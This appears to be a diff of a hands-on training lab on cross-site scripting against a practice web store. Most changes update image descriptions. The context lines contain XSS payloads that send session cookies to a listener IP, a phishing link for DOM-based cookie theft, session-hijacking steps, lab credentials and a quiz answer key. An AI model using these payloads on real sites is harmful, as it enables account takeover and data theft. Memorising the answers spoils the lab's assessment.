@@ -98,11 +98,11 @@ Our goal in this part of the lab is to execute a reflected cross-site scripting 
 
 2. (**Kali, Firefox**) Open Firefox and navigate to `http://market.skills.hub`. This lab **does not** use HTTPS. The web server has no SSL/TLS certificate, so all data between your browser and the server is sent in plain text. This setup is intentional.
 
-![s13-image1.png](./img/s13-image1.png)
+![Homepage of market.skills.hub showing featured products.](./img/s13-image1.png)
 
 3. (**Kali, Firefox**) Click the `PRODUCT SEARCH` link at the top of the page.
 
-![s13-image2.png](./img/s13-image2.png)
+![Product search page on market.skills.hub.](./img/s13-image2.png)
 
 4. (**Kali, Firefox**) Enter the following JavaScript into the text box and click the `Search` button.
 
@@ -110,11 +110,11 @@ Our goal in this part of the lab is to execute a reflected cross-site scripting 
 <script>alert("xss");</script>
 ```
 
-![s13-image3.png](./img/s13-image3.png)
+![Product search page with test JavaScript input '<script>alert("xss")</script>' entered in the search field on market.skills.hub.](./img/s13-image3.png)
 
 5. (**Kali, Firefox**) This should produce an alert dialog box with the string `xss` displayed as the message. 
 
-![s13-image4.png](./img/s13-image4.png)
+![Search results page displaying the effect of the JavaScript input '<script>alert("xss")</script>' in the product search on market.skills.hub.](./img/s13-image4.png)
 
 The steps below indicate we have discovered a reflected cross-site scripting vulnerability: 
    - We entered JavaScript into the web site's `Search` field.
@@ -168,7 +168,7 @@ In the next section, you perform a stored cross-site scripting attack.
 
 2. (**Kali, Firefox**) Open Firefox and navigate to `http://market.skills.hub`. This lab **does not** use HTTPS. The web server has no SSL/TLS certificate, so all data between your browser and the server is sent in plain text. This setup is intentional.
 
-![s13-image1.png](./img/s13-image1.png)
+![Homepage of market.skills.hub showing featured products.](./img/s13-image1.png)
 
 3. (**Kali, Firefox**) Click the `LOGIN` link on the top navigation menu. On the Login page, enter the following credentials, then click the `Login` button.
 
@@ -177,21 +177,21 @@ Email: bcampbell@skills.hub
 Password: operating
 ```
 
-![s13-image5-941250190.png](./img/s13-image5.png)
+![Login page of market.skills.hub.](./img/s13-image5.png)
 
 4. (**Kali, Firefox**) After logging in, you are redirected back to the market home page. Click the `View` link on one of the products. This takes you to a product detail page for that item where you can post a product review.
 
-![s13-image6.png](./img/s13-image6.png)
+![Dashboard after logging in to market.skills.hub.](./img/s13-image6.png)
 
-![s13-image7.png](./img/s13-image7.png)
+![Product page on market.skills.hub for leaving a product review.](./img/s13-image7.png)
 
 5. (**Kali, Firefox**) Click the `Add a Review` button.
 
-![s13-image8.png](./img/s13-image8.png)
+![Add a review form on market.skills.hub.](./img/s13-image8.png)
 
 6. (**Kali, Firefox**) Select any number of stars from the `Rating` field.
 
-![s13-image9.png](./img/s13-image9.png)
+![Submit a review page on market.skills.hub.](./img/s13-image9.png)
 
 7. (**Kali, Terminal**) Before saving our review, we want to set up a simple web server as a listener to see if our malicious script can capture any session cookies. Open a terminal window and enter the following command to start a Python web server listening on port 80.
 
@@ -199,11 +199,11 @@ Password: operating
 python3 -m http.server 80
 ```
 
-![s13-image10.png](./img/s13-image10.png)
+![Terminal showing a simple web listener being set up using 'python3 -m http.server 80'.](./img/s13-image10.png)
 
 8. (**Kali, Terminal**) Open a new terminal window on your Kali VM and get your IP address by typing `ip a` then hitting `enter`. Your IP address is the address attached to the `eth0` network interface. In this case, the IP address is `10.5.5.113`, but your IP address may be different. Take note of this IP address because we need it in the next step.
 
-![s13-image11.png](./img/s13-image11.png)
+![Terminal showing the result of the 'ip a' command.](./img/s13-image11.png)
 
 9. (**Kali, Firefox**) Go back to the product review page on the market web site. The `Review` text box looks like a great place to inject and store malicious JavaScript. Enter the following text in the `Review` field, making sure to replace the IP address of `10.5.5.113` with your IP address obtained in the previous step.
 
@@ -213,15 +213,15 @@ When this script executes the `document.cookie` command will retrieve the cookie
 <script type="text/javascript">document.location="http://10.5.5.113/?c="+document.cookie;</script>
 ```
 
-![s13-image12.png](./img/s13-image12.png)
+![Submit a review page on market.skills.hub with malicious JavaScript inserted.](./img/s13-image12.png)
 
 10. (**Kali, Firefox**) Click the `Submit Review` button to save your review. You are immediately redirected to `http://10.5.5.113/?c=PHPSESSID=0878tio7oh2jjdqmb1j8ckviaj`. Your IP address and PHPSESSID cookie value could be different, but the result should be the same. 
 
-![s13-image13.png](./img/s13-image13.png)
+![Result page on market.skills.hub after clicking Submit Review.](./img/s13-image13.png)
 
 11. (**Kali, Terminal**) Return to the terminal window running the Python web server. Here you can view the GET request made to the malicious actor's web server by the compromised client web browser.
 
-![s13-image18.png](./img/s13-image18.png)
+![Terminal showing data captured by the previously created Python listener.](./img/s13-image18.png)
 
 What just happened here? When you saved your product review, the script you entered was saved to the product review database. When the web site redirected you back to the product's detail page your script was executed.
 
@@ -280,11 +280,11 @@ What are some of the potential impacts of a DOM-based cross-site scripting attac
 
 2. (**Kali, Firefox**) Open Firefox and navigate to `http://market.skills.hub/promos.php`. This lab **does not** use HTTPS. The web server has no SSL/TLS certificate, so all data between your browser and the server is sent in plain text. This setup is intentional.
 
-![s13-image14.png](./img/s13-image14.png)
+![Promotions page on market.skills.hub.](./img/s13-image14.png)
 
 3. (**Kali, Firefox**) You should be looking at a page similar to the screen capture below. Here we can see a list of current promotions, including a link at the bottom of the page that says `Apply Coupons`. When the `Apply Coupons` link is clicked, you are greeted with a dialog box that says `Coupons applied to your account!`. 
 
-![s13-image15.png](./img/s13-image15.png)
+![Promotions page after clicking "Apply Coupons".](./img/s13-image15.png)
 
 4. (**Kali, Firefox**) Let's see if we can exploit this. Right click on the `Apply Coupons` link and select `Inspect` from the menu. The HTML code associated with this button looks like this:
 
@@ -292,7 +292,7 @@ What are some of the potential impacts of a DOM-based cross-site scripting attac
 <a id="couponlink" href="#" onclick="alert('Coupons applied to your account!');">Apply Coupons</a>
 ```
 
-![s13-image16.png](./img/s13-image16.png)
+!["Apply Coupons" link inspected on market.skills.hub.](./img/s13-image16.png)
 
 5. (**Kali, Firefox**) Below the link we can see a `<script>` tag. Let's expand this.
 
@@ -307,7 +307,7 @@ if (action) {
    }
 ```
 
-![s13-image17.png](./img/s13-image17.png)
+![Inspect view showing expanded <script> tag on promotions page.](./img/s13-image17.png)
 
 6. (**Kali, Firefox**) Based on the code, we can see that if there is a query string value named `apply` we can modify the behavior of the `onclick` event of this link.
 
@@ -315,7 +315,7 @@ if (action) {
 
 8. (**Kali**) Open a terminal window and get the IP address of your Kali machine by typing `ip a`. Look at the IP address associated with `eth0`. In our case it is `10.5.5.113`, but your IP address may be different.
 
-![s13-image11.png](./img/s13-image11.png)
+![Terminal showing result of 'ip a' command.](./img/s13-image11.png)
 
 9. (**Kali**) Enter the following command in your terminal window to start a local web server listening on port 9000 on your Kali machine.
 
@@ -323,7 +323,7 @@ if (action) {
 python3 -m http.server 9000
 ```
 
-![s13-image19.png](./img/s13-image19.png)
+![Terminal running 'python3 -m http.server 9000'.](./img/s13-image19.png)
 
 10. (**Kali, Firefox**) Imagine the scenario where a malicious actor creates a link in a phishing email with the hopes of capturing an actively logged-in user's session ID so they can impersonate them on the market web site. We can begin by creating a link like the one below. Make sure to replace the IP address of `10.5.5.113` with the IP address of your Kali VM from Step 8.
 
@@ -333,7 +333,7 @@ http://market.skills.hub/promos.php?apply=window.location.href=%27http://10.5.5.
 
 When a user clicks the link above that would be included in the email, they are taken to the `promos.php` page. The JavaScript on the page executes and modifies the link based on the code included in the `apply` querystring value. Once the user clicks the `Apply Coupons` page, the `onclick` event fires and the user's browser is redirected to a malicious web server (`http://10.5.5.113:9000`) with the current session cookie value included in the `session` querystring value.
 
-![s13-image20.png](./img/s13-image20.png)
+![Promotions page on market.skills.hub.](./img/s13-image20.png)
 
 It would probably be a good idea for the malicious actor to take one additional step to obfuscate the link by URL encoding it. We can do that with tools such as CyberChef. This step is not necessary for this lab, thus the details of how to do this will not be covered here.
 
@@ -343,7 +343,7 @@ http%3A%2F%2Fmarket%2Eskills%2Ehub%2Fpromos%2Ephp%3Fapply%3Dwindow%2Elocation%2E
 
 11. (**Kali, Firefox**) To simulate being the victim of this phishing scam, open a new browser window and paste the link you created in Step 10 into the URL bar then hit `enter`. 
 
-![s13-image20.png](./img/s13-image20.png)
+![Browser showing simulated phishing test with pasted URL.](./img/s13-image20.png)
 
 12. (**Kali, Firefox**) You are taken to the `promos.php` page of the market web site. Click the `Apply Coupons` link.
 
@@ -353,11 +353,11 @@ http%3A%2F%2Fmarket%2Eskills%2Ehub%2Fpromos%2Ephp%3Fapply%3Dwindow%2Elocation%2E
 http://10.5.5.113:9000/?session=PHPSESSID=9iv85t3j2uri6p3j4jn5spnb7v
 ```
 
-![s13-image21.png](./img/s13-image21.png)
+![Browser redirected to malicious web server.](./img/s13-image21.png)
 
 14. (**Kali, Terminal**) Return to the terminal window running the Python web server on port 9000. Here you can view the GET request made to the malicious actor's web server by the compromised client web browser.
 
-![s13-image22.png](./img/s13-image22.png)
+![Terminal showing Python web server GET request result.](./img/s13-image22.png)
 
 Had this user been logged in to the market web site, you could place that `PHPSESSID` value in your own cookie for the market web site and impersonate them without further authentication.
 
@@ -482,18 +482,18 @@ Protecting against cross-site scripting is hard. As is true in most security con
 *A solution guide link is available following the grading section, should you need it.*
 
 ### Mini-Challenge Objectives
-- Exploit the `SITE FEEDBACK` feature of the market web site to execute a stored cross-site scripting vulnerability.
+- Exploit the `SITE FEEDBACK` feature of the market web site (`http://market.skills.hub/feedback.php`) to execute a stored cross-site scripting vulnerability.
 - Use stored cross-site scripting to send a logged-in user's `PHPSESSID` cookie value to a server you control, such as a web server or netcat listener. 
 - Use this cookie to impersonate another market user and obtain the last 4 digits of their credit card number from their profile page.
   - Cookies are available in Firefox under the `Storage` tab of the `Web Developer Tools`. 
 
 - Once you have added and tested your malicious script, navigate to `https://skills.hub/lab/tasks` and click the `Submit` button to test your exploit. 
 
-![s13-image23.png](./img/s13-image23.png)
+![Grading page on skills.hub/lab/tasks with submit button clicked to test exploit.](./img/s13-image23.png)
 
 - You can click the `Refresh` button that appears to check the status of the test.
 
-![s13-image24.png](./img/s13-image24.png)
+![Grading page on skills.hub/lab/tasks after refresh.](./img/s13-image24.png)
 
 - After the following message appears under the `Status` column, return to the market web site and use your captured `PHPSESSID` cookie value to obtain the targeted user's credit card data.
 
@@ -501,7 +501,7 @@ Protecting against cross-site scripting is hard. As is true in most security con
 Success -- The user browsed the feedback site with their session token.
 ```
 
-![s13-image25.png](./img/s13-image25.png)
+![Grading page on skills.hub/lab/tasks showing grading results.](./img/s13-image25.png)
 
 ### Grading Check
 
@@ -510,6 +510,9 @@ Success -- The user browsed the feedback site with their session token.
 `Copy any token or flag strings to the corresponding question submission field to receive credit.`
 
 *Please attempt the mini-challenge as best you can, but if you get stuck you can reference the solution guide using the link below.*
+
+</p>
+</details>
 
 <details>
 <summary>
@@ -535,23 +538,6 @@ Skills exercised:
 - S0667: Skill in assessing security controls
 - S0544: Skill in recognizing vulnerabilities
 
-### Answer Key
-
-**Knowledge Check Question 1**: *Which three-letter acronym is also used to describe cross-site scripting?*
- - *`XSS`*
-
-**Knowledge Check Question 2**: *What kind of cross-site scripting occurs when a web site takes input from an HTTP request and incorporates that input in the HTTP response without any form of validation or encoding?*
- - *`reflected`*
-
-**Knowledge Check Question 3**: *What 10 letter word is another name for stored cross-site scripting?*
- - *`persistent`*
-
- **Knowledge Check Question 4**: *In the context of a web site, what does DOM stand for?*
-  - *`document object model`*
-
-**Knowledge Check Question 5**: *What is the HTML encoded equivalent of the & character?*
- - *`&amp;`*
-
 ### References
 
 - [1] <a href="https://www.cisa.gov/resources-tools/resources/secure-design-alert-eliminating-cross-site-scripting-vulnerabilities" target="_blank">Malicious Cyber Actors Use Cross-Site Scripting Vulnerability to Compromise Systems</a>
@@ -575,6 +561,31 @@ Skills exercised:
 - [10] <a href="https://www.cisa.gov/resources-tools/resources/federal-civilian-executive-branch-fceb-operational-cybersecurity-alignment-focal-plan" target="_blank">Federal Civilian Executive Branch (FCEB) Operational Cybersecurity Alignment (FOCAL)</a>
 
 - [11] <a href="https://niccs.cisa.gov/workforce-development/nice-framework" target="_blank">NICE Framework</a>
+
+</p>
+</details>
+
+
+<details>
+<summary>
+<h3>Answer Key</h3>
+</summary>
+<p>
+
+**Knowledge Check Question 1**: *Which three-letter acronym is also used to describe cross-site scripting?*
+ - *`XSS`*
+
+**Knowledge Check Question 2**: *What kind of cross-site scripting occurs when a web site takes input from an HTTP request and incorporates that input in the HTTP response without any form of validation or encoding?*
+ - *`reflected`*
+
+**Knowledge Check Question 3**: *What 10 letter word is another name for stored cross-site scripting?*
+ - *`persistent`*
+
+ **Knowledge Check Question 4**: *In the context of a web site, what does DOM stand for?*
+  - *`document object model`*
+
+**Knowledge Check Question 5**: *What is the HTML encoded equivalent of the & character?*
+ - *`&amp;`*
 
 </p>
 </details>
